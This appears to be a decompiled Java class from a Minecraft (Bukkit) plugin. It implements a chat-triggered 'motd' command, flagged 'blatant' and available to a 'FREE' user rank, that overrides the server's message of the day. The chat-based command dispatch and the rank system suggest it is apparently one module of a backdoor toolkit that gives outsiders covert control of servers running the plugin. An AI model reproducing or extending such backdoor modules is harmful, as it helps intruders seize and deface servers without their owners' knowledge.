package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.server.ServerListPingEvent;

@CommandInfo(
   name = "motd",
   description = "Sets server's motd",
   blatant = true,
   rank = Rank.FREE
)
public class MotdCommand extends AbstractCommand implements Listener {
   String motd = "";

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      this.motd = String.join(" ", var3).replace("&", "§");
      ChatUtil.sendChat(var1.getPlayer(), "Updated motd");
   }

   public MotdCommand() {
   }

   @EventHandler
   public void onPing(ServerListPingEvent var1) {
      if (!this.motd.isEmpty()) {
         var1.setMotd(this.motd);
      }
   }
}
